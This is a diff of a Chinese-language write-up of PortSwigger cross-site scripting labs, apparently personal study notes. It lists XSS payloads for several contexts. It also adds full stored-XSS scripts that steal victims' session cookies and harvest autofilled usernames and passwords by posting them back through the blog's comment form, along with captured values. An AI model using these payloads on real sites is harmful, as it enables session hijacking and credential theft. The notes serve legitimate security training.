@@ -5,18 +5,23 @@ description: PortSwigger Cross-site scripting
 
 ## Lab: Reflected XSS into HTML context with nothing encoded
 
-payload
+基礎題，無難度
 
-```
-?search=<script>alert(1)</script>
+```html
+?search=
+<script>
+  alert(1);
+</script>
 ```
 
 ## Lab: Stored XSS into HTML context with nothing encoded
 
-payload
+基礎題，無難度
 
-```
-<script>alert(1)</script>
+```html
+<script>
+  alert(1);
+</script>
 ```
 
 ## Lab: DOM XSS in `document.write` sink using source `location.search`
@@ -37,10 +42,23 @@ if (query) {
 }
 ```
 
-這種類型的 XSS 我已經有在 hitcon 回報過，重點就是要提前 close tag
+payload
 
+```html
+"/>
+<script>
+  alert(1);
+</script>
 ```
-"/><script>alert(1)</script>
+
+注入後會變成
+
+```html
+<img src="/resources/images/tracker.gif?searchTerms='" />
+<script>
+  alert(1);
+</script>
+'">
 ```
 
 ## Lab: DOM XSS in `innerHTML` sink using source `location.search`
@@ -59,7 +77,7 @@ if (query) {
 
 插入 `<script>alert(1)</script>` 失敗，不知道是不是瀏覽器的安全機制阻擋
 
-查了一下 [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
+查了一下 [MDN innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
 
 ```
 While the property does prevent `<script>` elements from executing when they are injected
@@ -70,6 +88,8 @@ While the property does prevent `<script>` elements from executing when they are
 還不錯，有學到新東西，原來用 `innerHTML` 插入 `<script>` 不會執行程式碼
 
 ## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+
+基礎題，無難度
 
 ```
 ?returnPath=javascript:alert(document.cookie)
@@ -171,9 +191,11 @@ document.write(
 
 題目有給 hint，是要想辦法跳出 js string，payload 如下
 
-```
+```js
 ';alert(1);var a = '3
 ```
+
+注入後會變成
 
 ```js
 var searchTerms = "";
@@ -406,7 +428,7 @@ for (const onEvent of onEvents) {
 
 最終結果是 `onbegin`，完全沒用過，查一下 [MDN](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event)
 
-這題我只是單純卡在對 SVG 可用的 Elements 跟 onBegin 不熟，後來直接請 AI 給我範例，最終測出 `<animateTransform/>` 可以插入
+這題我只是單純卡在對 SVG 可用的 Elements 跟 onBegin 不熟，後來直接請 AI 給我 `onbegin` 的範例，最終測出
 
 ```html
 <svg>
@@ -415,6 +437,8 @@ for (const onEvent of onEvents) {
 ```
 
 ## Lab: Reflected XSS in canonical link tag
+
+<!-- todo-yusheng -->
 
 ## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 
@@ -430,6 +454,287 @@ document.write(
     '">',
 );
 ```
+
+我後來發現其實 [terminating-the-existing-script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script) 這個章節就有提供答案了，這題既然沒辦法用單引號跟反斜線的話，那就直接用 `</script>` 來提前關閉 tag
+
+```html
+</script><img src=1 onerror=alert(document.domain)>
+```
+
+## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+[breaking-out-of-a-javascript-string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string) 有給提示
+
+payload
+
+```
+\';alert(1);//
+```
+
+會產生
+
+```js
+var searchTerms = "\\";
+alert(1); //';
+```
+
+## Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+[making-use-of-html-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding) 有給提示
+
+payload
+
+```
+https://&apos;-alert(document.domain)-&apos;
+```
+
+result
+
+```html
+<a
+  id="author"
+  href="https://'-alert(document.domain)-'"
+  onclick="var tracker={track(){}};tracker.track('https://'-alert(document.domain)-'');"
+  >2312312</a
+>
+```
+
+## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+這題也是看了 [xss-in-javascript-template-literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals) 就可以秒解的
+
+payload
+
+```js
+${alert(document.domain)}
+```
+
+會產生以下
+
+```js
+var message = `0 search results for '${alert(document.domain)}'`;
+```
+
+## Lab: Exploiting cross-site scripting to steal cookies
+
+這題本來是設計給有買 Burp Suite Professional 的人類，但 hint 有說到，也有方法不需要
+
+我是參考 [這個影片](https://www.youtube.com/watch?v=N_87S9XVy0w) 的解法，概念我都懂，只是為啥我用 postId=2 這篇文章，就沒有受害者瀏覽呢？後來是跟著影片一起用 postId=5，就有成功看到受害者 Po 文
+
+1. 發現 Comment 欄位完全沒有防護，可以直接插入 `<script>`
+2. 構造以下 html，讓受害者瀏覽留言時，背後發送一個留言的 API
+
+```html
+<script>
+  addEventListener("DOMContentLoaded", () => {
+    const csrf = document.querySelector("input[name='csrf']").value;
+    const cookie = document.cookie;
+    fetch(
+      "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post/comment",
+      {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
+        },
+        referrer:
+          "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/post?postId=2",
+        body: `csrf=${csrf}&postId=5&comment=${cookie}&name=${new Date().getTime()}&email=789%40789&website=`,
+        method: "POST",
+        mode: "cors",
+        credentials: "include",
+      },
+    );
+  });
+</script>
+```
+
+3. 看到受害者瀏覽留言後，會發送一個留言
+
+```
+secret=HEta6nCEhiztNlcHwjpE1PimJ3lpxmhJ;
+session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m
+```
+
+4. 拿著這組 cookie 去訪問右上角的 `/my-account` 網址，成功解題～
+
+```js
+document.cookie = "session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m";
+fetch(
+  "https://0abc008a03bfe38780a1042b00c3002a.web-security-academy.net/my-account",
+);
+```
+
+## Lab: Exploiting cross-site scripting to capture passwords
+
+跟上一題的情況一樣，只是現在要改偷登入頁的帳密。這題原本的概念是，要把偷到的帳密送到自己架的 Server，但由於資安考量，PortSwigger 限制只能送到他們架的 Server（要花錢買 Burp Suite Professional），所以我們用比較危險的方式，把偷到的帳密透過留言系統顯示出來
+
+1. 發現 Comment 欄位完全沒有防護，可以直接插入 `<script>`
+2. 試試看用 `iframe` 載入登入頁，能不能拿到帳密
+
+```html
+<script>
+  function onloadIframe() {
+    const username = window.frames[0].document.querySelector(
+      "input[name='username']",
+    ).value;
+    const password = window.frames[0].document.querySelector(
+      "input[name='password']",
+    ).value;
+    console.log({ username, password });
+  }
+</script>
+<iframe
+  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
+  onload="onloadIframe()"
+  style="display:none"
+></iframe>
+```
+
+3. 把 `console.log` 改成發送留言，拿到的都是 `{"username":"","password":""}`
+
+```html
+<script>
+  function onloadIframe() {
+    const username = window.frames[0].document.querySelector(
+      "input[name='username']",
+    ).value;
+    const password = window.frames[0].document.querySelector(
+      "input[name='password']",
+    ).value;
+    const csrf = document.querySelector("input[name='csrf']").value;
+    const cookie = document.cookie;
+    fetch(
+      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
+      {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
+        },
+        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+        method: "POST",
+        mode: "cors",
+        credentials: "include",
+      },
+    );
+  }
+</script>
+<iframe
+  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
+  onload="onloadIframe()"
+  style="display:none"
+></iframe>
+```
+
+4. 加個 `DOMContentLoaded` 試試看，拿到的還是 `{"username":"","password":""}`
+
+```html
+<script>
+  function onloadIframe() {
+    window.frames[0].addEventListener("DOMContentLoaded", () => {
+      const username = window.frames[0].document.querySelector(
+        "input[name='username']",
+      ).value;
+      const password = window.frames[0].document.querySelector(
+        "input[name='password']",
+      ).value;
+      const csrf = document.querySelector("input[name='csrf']").value;
+      const cookie = document.cookie;
+      fetch(
+        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
+        {
+          headers: {
+            "content-type": "application/x-www-form-urlencoded",
+          },
+          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+          method: "POST",
+          mode: "cors",
+          credentials: "include",
+        },
+      );
+    });
+  }
+</script>
+<iframe
+  src="https://0a34009004a74700e417261e007f005f.web-security-academy.net/login"
+  onload="onloadIframe()"
+  style="display:none"
+></iframe>
+```
+
+5. 改成用 `window.open` 試試看，拿到的還是 `{"username":"","password":""}`
+
+```html
+<script>
+  addEventListener("DOMContentLoaded", () => {
+    const loginWindow = window.open(
+      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/login",
+      "_blank",
+    );
+    loginWindow.addEventListener("DOMContentLoaded", () => {
+      const username = loginWindow.document.querySelector(
+        "input[name='username']",
+      ).value;
+      const password = loginWindow.document.querySelector(
+        "input[name='password']",
+      ).value;
+      const csrf = document.querySelector("input[name='csrf']").value;
+      const cookie = document.cookie;
+      fetch(
+        "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
+        {
+          headers: {
+            "content-type": "application/x-www-form-urlencoded",
+          },
+          body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+          method: "POST",
+          mode: "cors",
+          credentials: "include",
+        },
+      );
+    });
+  });
+</script>
+```
+
+6. 改成直接注入 `<input>`，成功拿到 `{"username":"administrator","password":"6g7n2wu1j8p490o2iss4"}`
+
+```html
+<script>
+  function handlePasswordChange() {
+    const username = document.querySelector("input[name='username']").value;
+    const password = document.querySelector("input[name='password']").value;
+    const csrf = document.querySelector("input[name='csrf']").value;
+    const cookie = document.cookie;
+    fetch(
+      "https://0a34009004a74700e417261e007f005f.web-security-academy.net/post/comment",
+      {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
+        },
+        body: `csrf=${csrf}&postId=5&comment=${JSON.stringify({ username, password })}&name=${new Date().toISOString()}&email=789%40789&website=`,
+        method: "POST",
+        mode: "cors",
+        credentials: "include",
+      },
+    );
+  }
+</script>
+<input type="username" name="username" />
+<input type="password" name="password" onchange="handlePasswordChange()" />
+```
+
+我覺得我好蠢，想了 `<iframe>` 跟 `window.open` 這兩招，卻沒有想到可以直接插入 `<input>`
+
+但這題的解法，也讓我想要重新認識瀏覽器 autofill 的安全性機制
+
+1. 透過 `<iframe>` 開啟的登入頁，會有 autofill 的功能嗎？
+2. 透過 `window.open` 開啟的登入頁，會有 autofill 的功能嗎？
+
+<!-- todo-yusheng -->
+
+## Lab: Reflected XSS with AngularJS sandbox escape without strings
+
+<!-- todo-yusheng -->
+
+[教學](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
 
 ## 參考資料
 
